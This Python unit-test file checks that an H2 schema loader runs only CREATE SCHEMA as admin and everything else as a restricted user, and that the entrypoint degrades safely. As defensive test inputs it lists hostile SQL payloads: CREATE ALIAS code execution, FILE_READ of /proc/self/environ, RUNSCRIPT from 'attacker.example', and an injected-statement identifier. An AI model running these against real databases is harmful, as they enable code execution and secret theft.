# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: Apache-2.0

"""Unit tests for the privilege split in load-schema.sh.

schema.sql is generated from namespace-supplied metadata and then fed to H2's
RunScript. H2 gives a script the full SQL surface, and ``CREATE ALIAS`` compiles
and runs Java — so running the whole file as the H2 admin turns a bad mapping
literal into code execution in the VKG container. load-schema.sh therefore runs
only the statements that genuinely need admin rights (``CREATE SCHEMA``, which
H2 does not delegate) as ``sa``, and everything else as a user holding just
``ALTER ANY SCHEMA``.

These tests run the REAL script with a stub ``java`` on PATH, so they assert
which SQL is handed to which H2 user rather than re-implementing the split.
Verified against h2-2.2.224 (the version pinned in the Dockerfile): CREATE
ALIAS, FILE_READ, RUNSCRIPT and CREATE SCHEMA all fail with "Admin rights are
required" for the unprivileged user, so anything that lands in the second half
fails closed and the entrypoint falls back to degraded mode.
"""

from __future__ import annotations

import json
import subprocess
from pathlib import Path

import pytest

pytestmark = pytest.mark.unit

_PACKAGE = Path(__file__).resolve().parents[2]
_LOAD_SCHEMA = _PACKAGE / "load-schema.sh"
_ENTRYPOINT = _PACKAGE / "entrypoint.sh"

_STUB_JAVA = """#!/usr/bin/env bash
# Stand-in for `java -cp ... org.h2.tools.RunScript`: records the user, the URL
# and the script body each RunScript invocation would have executed.
user=""
url=""
script=""
while [ $# -gt 0 ]; do
  case "$1" in
    -user) user="$2"; shift 2 ;;
    -url) url="$2"; shift 2 ;;
    -script) script="$2"; shift 2 ;;
    *) shift ;;
  esac
done
python3 - "$user" "$url" "$script" "${LOAD_SCHEMA_CALL_LOG}" <<'PY'
import json, sys
user, url, script, log = sys.argv[1:5]
with open(log, "a") as fh:
    fh.write(json.dumps({"user": user, "url": url, "sql": open(script).read()}) + "\\n")
PY
"""


def _run(tmp_path: Path, schema_sql: str) -> list[dict[str, str]]:
    """Run load-schema.sh over ``schema_sql``; return the recorded RunScript calls."""
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir(parents=True)
    stub = bin_dir / "java"
    stub.write_text(_STUB_JAVA)
    stub.chmod(0o755)

    schema_file = tmp_path / "schema.sql"
    schema_file.write_text(schema_sql)
    call_log = tmp_path / "calls.jsonl"

    subprocess.run(
        ["bash", str(_LOAD_SCHEMA), str(schema_file), str(tmp_path / "vkgdb"), "/opt/ontop/lib/*"],
        env={
            "PATH": f"{bin_dir}:/usr/bin:/bin",
            "LOAD_SCHEMA_CALL_LOG": str(call_log),
        },
        capture_output=True,
        text=True,
        check=True,
    )
    return [json.loads(line) for line in call_log.read_text().splitlines()]


_GENERATED = """-- Auto-generated schema for Ontop H2 validation (from datasource catalog)
CREATE SCHEMA IF NOT EXISTS "public";
CREATE TABLE IF NOT EXISTS "public"."customers" ("id" INTEGER);
CREATE TABLE IF NOT EXISTS "orders" ("id" INTEGER);
"""


class TestPrivilegeSplit:
    def test_admin_runs_only_user_setup_and_schema_declarations(self, tmp_path: Path):
        admin, _ = _run(tmp_path, _GENERATED)

        assert admin["user"] == "sa"
        statements = [line for line in admin["sql"].splitlines() if line.strip()]
        assert statements == [
            statements[0],  # CREATE USER, with a per-task random password
            statements[1],  # ALTER USER, so a reused data volume gets the new one
            "GRANT ALTER ANY SCHEMA TO VKG_LOADER;",
            'CREATE SCHEMA IF NOT EXISTS "public";',
        ]
        assert statements[0].startswith("CREATE USER IF NOT EXISTS VKG_LOADER PASSWORD '")
        assert "CREATE TABLE" not in admin["sql"]

    def test_tables_run_as_the_unprivileged_user(self, tmp_path: Path):
        _, loader = _run(tmp_path, _GENERATED)

        assert loader["user"] == "VKG_LOADER"
        assert 'CREATE TABLE IF NOT EXISTS "public"."customers" ("id" INTEGER);' in loader["sql"]
        assert 'CREATE TABLE IF NOT EXISTS "orders" ("id" INTEGER);' in loader["sql"]
        assert "CREATE SCHEMA" not in loader["sql"]

    def test_loader_password_is_random_per_task(self, tmp_path: Path):
        first, _ = _run(tmp_path, _GENERATED)
        second, _ = _run(tmp_path / "again", _GENERATED)

        assert first["sql"] != second["sql"]

    def test_neither_connection_sets_db_close_delay(self, tmp_path: Path):
        # DB_CLOSE_DELAY is admin-only, so the unprivileged connection cannot
        # reuse the URL Ontop is given; both RunScript calls use the plain URL.
        for call in _run(tmp_path, _GENERATED):
            assert "DB_CLOSE_DELAY" not in call["url"]
            assert call["url"].startswith("jdbc:h2:")

    @pytest.mark.parametrize(
        "statement",
        [
            # Admin-only in H2: each of these is refused for VKG_LOADER, so the
            # container degrades instead of executing it.
            'CREATE ALIAS EXEC_CMD AS $$ String c() { return "x"; } $$;',
            "CALL FILE_READ('/proc/self/environ', NULL);",
            "RUNSCRIPT FROM 'http://attacker.example/evil.sql';",
            "CREATE SCHEMA attacker;",
            # Not the exact safe shape, so it must NOT be treated as one:
            "CREATE SCHEMA IF NOT EXISTS s; CREATE ALIAS A AS $$ x $$;",
            'CREATE SCHEMA IF NOT EXISTS "s" AUTHORIZATION sa;',
            "create schema if not exists s;",
            "CREATE SCHEMA IF NOT EXISTS s",
        ],
    )
    def test_unexpected_statements_never_reach_the_admin_connection(self, tmp_path: Path, statement: str):
        admin, loader = _run(tmp_path, f'CREATE SCHEMA IF NOT EXISTS "public";\n{statement}\n')

        assert statement not in admin["sql"]
        assert statement in loader["sql"]

    @pytest.mark.parametrize(
        "name",
        [
            '"public"',
            "sales",
            '"q1.results"',
            '"we""ird"',
            # Doubled quotes make this ONE identifier, however odd it looks, so
            # H2 cannot read the embedded text as a second statement.
            '"a""; CREATE ALIAS X AS $$ y $$; --"',
        ],
    )
    def test_well_formed_schema_declarations_run_as_admin(self, tmp_path: Path, name: str):
        declaration = f"CREATE SCHEMA IF NOT EXISTS {name};"
        admin, loader = _run(tmp_path, f"{declaration}\n")

        assert declaration in admin["sql"]
        assert declaration not in loader["sql"]

    def test_empty_halves_are_not_an_error(self, tmp_path: Path):
        # grep exits 1 on no match; under `set -e` that would abort the load and
        # degrade a namespace whose tables are all unqualified.
        admin, loader = _run(tmp_path, 'CREATE TABLE IF NOT EXISTS "orders" ("id" INTEGER);\n')

        assert "CREATE SCHEMA" not in admin["sql"]
        assert "CREATE TABLE" in loader["sql"]


def _schema_loading_block() -> str:
    """The schema-loading section of the REAL entrypoint.sh, as text to run.

    Cut from the shipped file rather than copied into the test, so a change to
    the entrypoint changes what these tests execute. The section is taken whole:
    from the H2 path assignments through the ``fi`` that closes
    ``if [ -f "${SCHEMA_FILE}" ]``. Running the entrypoint end to end is not an
    option here — it hardcodes ``/app`` and starts Ontop — but this block is the
    part the privilege split depends on.
    """
    lines = _ENTRYPOINT.read_text().splitlines()
    start = next(i for i, line in enumerate(lines) if line.startswith("H2_DB_PATH="))
    end = next(i for i, line in enumerate(lines[start:], start) if line == "fi")
    return "\n".join(lines[start : end + 1])


def _run_schema_load(tmp_path: Path, *, loader_exit: int, artifacts: dict[str, str]) -> subprocess.CompletedProcess:
    """Execute the entrypoint's schema-loading block with a stub loader."""
    artifact_dir = tmp_path / "ontology"
    artifact_dir.mkdir(parents=True)
    for name, body in artifacts.items():
        (artifact_dir / name).write_text(body)

    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    # Records every path handed to the loader, so a stray .sql reaching it fails
    # the test rather than being loaded quietly.
    loader = bin_dir / "load-schema.sh"
    loader.write_text(f'#!/usr/bin/env bash\nprintf "%s\\n" "$@" >> "{tmp_path}/loader_args"\nexit {loader_exit}\n')
    loader.chmod(0o755)
    # The degraded-mode fallback is `exec python3 /app/translate-server.py …`;
    # this stands in for it so the fallback is observable.
    py = bin_dir / "python3"
    py.write_text('#!/usr/bin/env bash\necho "DEGRADED-SERVER $*"\n')
    py.chmod(0o755)

    script = tmp_path / "block.sh"
    block = _schema_loading_block().replace("/app/load-schema.sh", str(loader))
    script.write_text(
        "set -euo pipefail\n"
        f'ARTIFACT_DIR="{artifact_dir}"\n'
        'ONTOLOGY_BUCKET="b"\nONTOLOGY_PREFIX="ontologies/"\nNAMESPACE="ns"\nVERSION="v1"\n'
        'ENDPOINT_PORT="8080"\nONTOP_PORT="8081"\n'
        f"{block}\n"
        'echo "REACHED-ONTOP-STARTUP"\n'
    )
    return subprocess.run(
        ["bash", str(script)],
        env={"PATH": f"{bin_dir}:/usr/bin:/bin"},
        capture_output=True,
        text=True,
    )


class TestEntrypointSchemaLoadBehaviour:
    """What the entrypoint does, not what it says — the text checks below can
    all pass while this path is broken, and a broken fallback means a namespace
    with an unloadable schema takes the container down instead of degrading."""

    def test_a_failed_load_degrades_instead_of_aborting(self, tmp_path: Path):
        result = _run_schema_load(tmp_path, loader_exit=1, artifacts={"schema.sql": "CREATE TABLE t (id INT);\n"})

        assert result.returncode == 0, result.stderr
        assert "WARN: Cannot load schema file" in result.stdout
        assert "degraded mode" in result.stdout
        assert "DEGRADED-SERVER" in result.stdout
        # execs the degraded server, so Ontop startup is never reached — but the
        # script did not die under `set -e` either.
        assert "REACHED-ONTOP-STARTUP" not in result.stdout

    def test_a_successful_load_continues_to_ontop(self, tmp_path: Path):
        result = _run_schema_load(tmp_path, loader_exit=0, artifacts={"schema.sql": "CREATE TABLE t (id INT);\n"})

        assert result.returncode == 0, result.stderr
        assert "WARN" not in result.stdout
        assert "DEGRADED-SERVER" not in result.stdout
        assert "REACHED-ONTOP-STARTUP" in result.stdout

    def test_a_stray_sql_artifact_is_never_handed_to_the_loader(self, tmp_path: Path):
        result = _run_schema_load(
            tmp_path,
            loader_exit=0,
            artifacts={
                "schema.sql": "CREATE TABLE t (id INT);\n",
                # Any other .sql object someone can land in the namespace prefix.
                "other.sql": "CREATE ALIAS EXEC AS $$ void f() {} $$;\n",
            },
        )

        assert result.returncode == 0, result.stderr
        args = (tmp_path / "loader_args").read_text().splitlines()
        assert args[0] == str(tmp_path / "ontology" / "schema.sql")
        assert not any("other.sql" in arg for arg in args)

    def test_no_schema_file_is_not_a_failure(self, tmp_path: Path):
        # schema.sql is optional: a namespace with no catalog-derived schema must
        # still start, and must not be reported as a schema load failure.
        result = _run_schema_load(tmp_path, loader_exit=1, artifacts={})

        assert result.returncode == 0, result.stderr
        assert "WARN" not in result.stdout
        assert "REACHED-ONTOP-STARTUP" in result.stdout
        assert not (tmp_path / "loader_args").exists()


class TestEntrypointWiring:
    def test_schema_file_is_a_fixed_name_not_a_glob(self):
        text = _ENTRYPOINT.read_text()

        # Globbing `*.sql` and taking `head -1` would load whichever .sql object
        # happens to sort first in the namespace prefix.
        assert 'SCHEMA_FILE="${ARTIFACT_DIR}/schema.sql"' in text
        assert '-name "*.sql"' not in text

    def test_entrypoint_delegates_the_load_and_never_runs_the_script_as_sa(self):
        text = _ENTRYPOINT.read_text()

        assert "/app/load-schema.sh" in text
        assert "org.h2.tools.RunScript" not in text

    def test_dockerfile_ships_the_loader_executable(self):
        dockerfile = (_PACKAGE / "Dockerfile").read_text()

        assert "COPY --chown=ontop:ontop load-schema.sh /app/load-schema.sh" in dockerfile
        assert "chmod +x /app/entrypoint.sh /app/load-schema.sh" in dockerfile
